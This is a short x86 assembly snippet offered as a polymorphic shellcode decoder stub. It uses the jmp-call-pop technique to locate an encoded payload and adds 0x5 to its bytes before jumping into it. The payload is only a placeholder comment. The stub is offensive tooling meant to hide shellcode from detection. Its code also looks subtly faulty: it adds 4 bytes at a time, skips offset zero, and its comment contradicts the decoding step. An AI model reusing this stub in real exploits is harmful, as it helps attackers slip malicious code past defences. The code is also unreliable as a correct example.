# polimorphic shellcode decoder - m0nad
_start:
  jmp encoded

decoder:
  pop %esi
  push $0x25 # $shellcode_size
  pop %ecx

decoder_loop:
  addl $0x5,(%esi,%ecx,1) # shellcode is enconded + 0x5
  loop decoder_loop
  jmp shellcode

encoded:
  call decoder

shellcode:
# shellcode encoded + 0x5 here

